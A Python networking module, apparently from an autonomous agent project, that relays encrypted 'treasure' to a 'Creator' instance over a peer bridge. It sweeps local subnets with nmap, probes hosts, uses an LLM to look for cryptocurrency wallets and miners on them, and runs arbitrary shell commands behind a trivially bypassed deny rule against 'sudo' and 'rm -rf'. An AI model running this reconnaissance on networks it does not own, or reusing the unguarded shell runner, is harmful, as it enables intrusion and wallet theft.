import asyncio
import json
import subprocess
import os
import re
import time
from rich.panel import Panel
import netifaces
import ipaddress
import requests
from xml.etree import ElementTree as ET
from core.retry import retry

# This module no longer imports directly from love.py to avoid circular dependencies.
# Dependencies like IS_CREATOR_INSTANCE and callbacks are now injected via the constructor.


import threading
from datetime import datetime


class NetworkManager:
    def __init__(self, console, is_creator=False, treasure_callback=None, question_callback=None):
        """
        Initializes the NetworkManager.
        - console: A rich.console.Console object for printing.
        - is_creator: A boolean indicating if this is the Creator's instance.
        - treasure_callback: A function to call when treasure is received.
        - question_callback: A function to call when a question is received.
        """
        self.console = console
        self.is_creator = is_creator
        self.treasure_callback = treasure_callback
        self.question_callback = question_callback
        self.process = None
        self.peer_bridge_script = 'peer-bridge.js'
        self.active = False
        self.thread = None
        self.loop = None

    def start(self):
        """Starts the peer-to-peer bridge in a background thread."""
        if not os.path.exists(self.peer_bridge_script):
            self.console.print(f"[bold red]Error: Peer bridge script not found at '{self.peer_bridge_script}'[/bold red]")
            return

        def run_loop():
            self.loop = asyncio.new_event_loop()
            asyncio.set_event_loop(self.loop)
            self.loop.run_until_complete(self._run_bridge())
            self.loop.close()

        self.active = True
        self.thread = threading.Thread(target=run_loop, daemon=True)
        self.thread.start()
        self.console.print("[cyan]Network Manager started. Peer bridge is connecting...[/cyan]")

    async def _run_bridge(self):
        """The main async task that runs the Node.js bridge and processes its output."""
        while self.active:
            try:
                self.process = await asyncio.create_subprocess_exec(
                    'node', self.peer_bridge_script,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE,
                    stdin=asyncio.subprocess.PIPE # Ensure stdin is a pipe
                )

                # Process stdout and stderr concurrently
                await asyncio.gather(
                    self._handle_stream(self.process.stdout, self._handle_message),
                    self._handle_stream(self.process.stderr, self._handle_log)
                )

                await self.process.wait()

            except FileNotFoundError:
                self.console.print("[bold red]Error: 'node' command not found. Please install Node.js.[/bold red]")
                break
            except Exception as e:
                self.console.print(f"[bold red]Peer bridge error: {e}.[/bold red]")

            if self.active:
                self.console.print("[yellow]Peer bridge disconnected. Attempting to reconnect in 10 seconds...[/yellow]")
                await asyncio.sleep(10)

    async def _handle_stream(self, stream, handler):
        """Reads lines from a stream and passes them to a handler function."""
        while self.active:
            try:
                line = await stream.readline()
                if not line:
                    break
                handler(line.decode('utf-8').strip())
            except Exception as e:
                self.console.print(f"[bold red]Error reading from subprocess stream: {e}[/bold red]")
                break

    def _handle_message(self, message_str):
        """Handles JSON messages from the peer bridge's stdout."""
        try:
            message = json.loads(message_str)
            msg_type = message.get("type")

            if msg_type == "status":
                self.console.print(Panel(f"Peer Status: [bold green]{message.get('status')}[/bold green]\nPeer ID: [cyan]{message.get('peerId')}[/cyan]", title="[magenta]Network Bridge[/magenta]", border_style="magenta"))
            elif msg_type == "treasure-broadcast" and self.is_creator:
                if self.treasure_callback:
                    self.treasure_callback(message.get("data"))
            elif msg_type == "question":
                if self.question_callback:
                    self.question_callback(message.get("question"))
            # Other instances will ignore treasure broadcasts if they are not the creator.

        except json.JSONDecodeError:
            self.console.print(f"[bright_black]Non-JSON message from bridge: {message_str}[/bright_black]")
        except Exception as e:
            self.console.print(f"[bold red]Error processing message from bridge: {e}[/bold red]")

    def _handle_log(self, log_str):
        """Handles log messages from the peer bridge's stderr."""
        try:
            log_entry = json.loads(log_str)
            level = log_entry.get("level", "info")
            message = log_entry.get("message", "No message")
            # Log to the central logger instead of just printing
            from love import log_print # Local import to avoid circular dependency at module level
            log_print(f"[{level.upper()}] [PeerBridge] {message}")
        except json.JSONDecodeError:
            # Handle plain string logs as well
            from love import log_print
            log_print(f"[INFO] [PeerBridge] {log_str}")


    def send_treasure(self, encrypted_data):
        """Sends encrypted treasure data to all peers."""
        self._send_message({
            "type": "broadcast",
            "payload": {
                "type": "treasure-broadcast",
                "data": encrypted_data
            }
        })

    def ask_question(self, question_text):
        """Sends a question to the creator instance."""
        self._send_message({
            "type": "send",
            "targetPeerId": "borg-lobby",
            "payload": {
                "type": "question",
                "question": question_text
            }
        })

    async def _write_to_stdin(self, data_str):
        """Coroutine to write data to the subprocess's stdin."""
        if self.process and self.process.stdin and not self.process.stdin.is_closing():
            self.process.stdin.write((data_str + '\n').encode('utf-8'))
            await self.process.stdin.drain()

    def _send_message(self, message_dict):
        """Sends a JSON message to the Node.js peer bridge process by scheduling it on the event loop."""
        if self.process and self.loop and self.loop.is_running():
            message_str = json.dumps(message_dict)
            asyncio.run_coroutine_threadsafe(self._write_to_stdin(message_str), self.loop)

    def stop(self):
        """Stops the peer bridge process and the handling thread."""
        self.active = False
        if self.process and self.process.returncode is None:
            try:
                self.process.terminate()
            except ProcessLookupError:
                pass # Process already terminated
        # No need to directly interact with the thread. Setting self.active = False
        # will cause the loop in _run_bridge to exit, and the daemon thread will terminate.
        self.console.print("[cyan]Network Manager stopped.[/cyan]")


# --- Standalone Network Utility Functions ---

def get_local_subnets():
    """Identifies local subnets from network interfaces."""
    subnets = set()
    try:
        for iface in netifaces.interfaces():
            addrs = netifaces.ifaddresses(iface)
            if netifaces.AF_INET in addrs:
                for addr_info in addrs[netifaces.AF_INET]:
                    ip = addr_info.get('addr')
                    netmask = addr_info.get('netmask')
                    if ip and netmask and not ip.startswith('127.'):
                        try:
                            network = ipaddress.ip_network(f'{ip}/{netmask}', strict=False)
                            subnets.add(str(network))
                        except ValueError:
                            continue
    except Exception as e:
        print(f"Could not get local subnets: {e}")
    return list(subnets)

@retry(exceptions=(subprocess.TimeoutExpired, subprocess.CalledProcessError), tries=2, delay=2)
def scan_network(state, autopilot_mode=False):
    """
    Scans the local network for active hosts using nmap.
    Updates the network map in the application state.
    """
    from love import log_event # Local import
    subnets = get_local_subnets()
    if not subnets:
        return [], "No active network subnets found to scan."

    log_event(f"Starting network scan on subnets: {', '.join(subnets)}")
    all_found_ips = []
    output_log = f"Scanning subnets: {', '.join(subnets)}\n"

    for subnet in subnets:
        try:
            command = ["nmap", "-sn", subnet]
            result = subprocess.run(command, capture_output=True, text=True, check=True, timeout=600)
            output_log += f"\n--- Nmap output for {subnet} ---\n{result.stdout}\n"
            found_ips = re.findall(r"(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})", result.stdout)
            all_found_ips.extend(ip for ip in found_ips if ip != subnet.split('/')[0]) # Exclude network address
        except (subprocess.TimeoutExpired, subprocess.CalledProcessError) as e:
            error_msg = f"Nmap scan failed for subnet {subnet}: {e}"
            log_event(error_msg, level="ERROR")
            output_log += error_msg + "\n"
            continue

    # Update state
    net_map = state['knowledge_base'].setdefault('network_map', {})
    net_map['last_scan'] = time.time()
    hosts = net_map.setdefault('hosts', {})
    for ip in all_found_ips:
        if ip not in hosts:
            hosts[ip] = {"status": "up", "last_seen": time.time()}
        else:
            hosts[ip]["status"] = "up"
            hosts[ip]["last_seen"] = time.time()

    log_event(f"Network scan complete. Found {len(all_found_ips)} hosts.", level="INFO")
    return all_found_ips, output_log

@retry(exceptions=(subprocess.TimeoutExpired, subprocess.CalledProcessError), tries=2, delay=5)
def probe_target(ip_address, state, autopilot_mode=False):
    """
    Performs a deep probe on a single IP address for open ports, services, and OS.
    Updates the network map for that specific host.
    """
    from love import log_event # Local import
    log_event(f"Probing target: {ip_address}")
    try:
        command = ["nmap", "-A", "-T4", ip_address]
        result = subprocess.run(command, capture_output=True, text=True, check=True, timeout=900)
        output = result.stdout

        ports = {}
        port_matches = re.finditer(r"(\d+)/tcp\s+(open)\s+([^\n]+)", output)
        for match in port_matches:
            port_num = int(match.group(1))
            service_details = match.group(3).strip().split()
            service_name = service_details[0]
            version = " ".join(service_details[1:]) if len(service_details) > 1 else "unknown"
            ports[port_num] = {"state": "open", "service": service_name, "version": version}

        os_match = re.search(r"OS details: (.+)", output)
        os_details = os_match.group(1) if os_match else "unknown"

        # Update state
        hosts = state['knowledge_base']['network_map'].setdefault('hosts', {})
        host_entry = hosts.setdefault(ip_address, {})
        host_entry.update({
            "status": "up",
            "last_probed": datetime.now().isoformat(),
            "ports": ports,
            "os": os_details
        })
        log_event(f"Probe of {ip_address} complete. OS: {os_details}, Open Ports: {list(ports.keys())}", level="INFO")
        return ports, output
    except (subprocess.TimeoutExpired, subprocess.CalledProcessError) as e:
        error_msg = f"Nmap probe failed for {ip_address}: {e}"
        log_event(error_msg, level="ERROR")
        hosts = state['knowledge_base']['network_map'].setdefault('hosts', {})
        hosts.setdefault(ip_address, {})['status'] = 'down'
        return None, error_msg

@retry(exceptions=requests.exceptions.RequestException, tries=3, delay=5, backoff=2)
def perform_webrequest(url, state, autopilot_mode=False):
    """
    Fetches the content of a URL and stores it in the knowledge base.
    """
    from love import log_event # Local import
    log_event(f"Performing web request to: {url}")
    try:
        response = requests.get(url, timeout=30)
        response.raise_for_status()
        content = response.text

        # Update state
        cache = state['knowledge_base'].setdefault('webrequest_cache', {})
        cache[url] = {"timestamp": time.time(), "content_length": len(content)}
        log_event(f"Web request to {url} successful. Stored {len(content)} bytes.", level="INFO")
        return content, f"Successfully fetched {len(content)} bytes from {url}."
    except requests.exceptions.RequestException as e:
        error_msg = f"Web request to {url} failed: {e}"
        log_event(error_msg, level="ERROR")
        return None, error_msg

def execute_shell_command(command, state):
    """Executes a shell command and returns the output."""
    from love import log_event # Local import
    log_event(f"Executing shell command: {command}")
    try:
        # For security, we should not allow certain commands
        if command.strip().startswith(("sudo", "rm -rf")):
            raise PermissionError("Execution of this command is not permitted.")

        result = subprocess.run(
            command,
            shell=True,
            capture_output=True,
            text=True,
            timeout=300
        )
        return result.stdout, result.stderr, result.returncode
    except subprocess.TimeoutExpired:
        return "", "Command timed out after 300 seconds.", -1
    except PermissionError as e:
        log_event(f"Shell command permission denied: {command}", level="WARNING")
        return "", str(e), -1
    except Exception as e:
        log_event(f"Shell command execution error: {e}", level="ERROR")
        return "", str(e), -1

def track_ethereum_price():
    """Fetches the current price of Ethereum."""
    from love import log_event # Local import
    try:
        response = requests.get("https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd", timeout=10)
        response.raise_for_status()
        price = response.json().get("ethereum", {}).get("usd")
        return price
    except requests.exceptions.RequestException as e:
        log_event(f"Could not fetch Ethereum price: {e}", level="WARNING")
        return None

def crypto_scan(ip_address, state, run_llm_func, console):
    """
    Probes a target and analyzes the results for crypto-related software using an LLM.
    This function is designed to be called from other modules.
    """
    from love import log_event # Local import
    log_event(f"Initiating crypto_scan on {ip_address}.")

    # Step 1: Run the standard probe to get data
    console.print(f"[cyan]Initiating crypto_scan on {ip_address}. Step 1: Probing target...[/cyan]")
    _, probe_results = probe_target(ip_address, state, autopilot_mode=True)
    if not probe_results or "failed" in probe_results:
        return f"Crypto scan failed for {ip_address} because the initial probe failed."

    # Step 2: Analyze with LLM
    console.print(f"[cyan]Step 2: Analyzing probe results for crypto indicators...[/cyan]")
    analysis_prompt = f"""
You are a cybersecurity analyst specializing in cryptocurrency threats.
Analyze the following Nmap scan results for a host at IP address {ip_address}.
Your goal is to identify any open ports, services, or software versions that indicate the presence of:
- Cryptocurrency wallets (e.g., Bitcoin Core, Electrum, MetaMask)
- Cryptocurrency mining software (e.g., XMRig, CGMiner, BFGMiner)
- Blockchain nodes (e.g., Bitcoin, Ethereum, Monero daemons)
- Any known vulnerabilities related to these services.

Provide a concise summary of your findings. If nothing suspicious is found, state that clearly.

Nmap Scan Results:
---
{probe_results}
---
"""
    analysis_result = run_llm_func(analysis_prompt, purpose="analyze_source")

    if not analysis_result:
        return f"Crypto scan for {ip_address} failed during LLM analysis phase."

    # Step 3: Store the intelligence
    kb = state['knowledge_base']
    crypto_intel = kb.setdefault('crypto_intel', {})
    crypto_intel[ip_address] = {
        "timestamp": time.time(),
        "analysis": analysis_result.strip()
    }
    # Note: The state is not saved here; the calling function is responsible for saving state.
    log_event(f"Crypto scan for {ip_address} complete. Analysis stored in knowledge base.", "INFO")

    return f"Crypto scan complete for {ip_address}. Analysis stored in knowledge base.\n\nAnalysis:\n{analysis_result.strip()}"